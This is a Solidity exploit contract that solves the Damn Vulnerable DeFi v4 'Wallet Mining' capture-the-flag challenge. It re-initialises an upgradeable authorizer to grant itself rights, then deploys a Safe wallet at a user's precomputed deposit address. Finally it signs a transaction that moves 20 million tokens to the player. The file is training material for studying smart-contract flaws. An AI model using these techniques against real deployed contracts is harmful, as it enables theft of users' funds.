// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {Test} from "forge-std/Test.sol";

interface ISafe {
    function execTransaction(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory signatures
    ) external payable returns (bool success);

    function getTransactionHash(
        address to,
        uint256 value,
        bytes calldata data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        uint256 _nonce
    ) external view returns (bytes32);
}

contract WalletMiningAttacker is Test {
    address constant USER_DEPOSIT_ADDRESS =
        0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    address player;
    address ward;
    DamnValuableToken token;
    uint256 nonce;
    bytes initializer;
    uint256 userPrivateKey;

    constructor(
        AuthorizerUpgradeable _authorizer,
        WalletDeployer _walletDeployer,
        DamnValuableToken _token,
        address _player,
        address _ward,
        uint256 _nonce,
        bytes memory _initializer,
        uint256 _userPrivateKey
    ) {
        authorizer = _authorizer;
        walletDeployer = _walletDeployer;
        token = _token;
        player = _player;
        ward = _ward;
        nonce = _nonce;
        initializer = _initializer;
        userPrivateKey = _userPrivateKey;
    }

    function attack() public {
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);
        wards[0] = address(this);
        aims[0] = USER_DEPOSIT_ADDRESS;

        // set up the mapping 'wards'
        authorizer.init(wards, aims);

        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);
        token.transfer(ward, token.balanceOf(address(this)));

        bytes memory data = abi.encodeWithSelector(
            token.transfer.selector,
            player,
            DEPOSIT_TOKEN_AMOUNT
        );

        bytes32 safeTxHash = ISafe(USER_DEPOSIT_ADDRESS).getTransactionHash(
            address(token),
            0,
            data,
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            0
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, safeTxHash);

        bytes memory signature = abi.encodePacked(r, s, v);

        ISafe(USER_DEPOSIT_ADDRESS).execTransaction(
            address(token),
            0,
            data,
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            signature
        );
    }
}
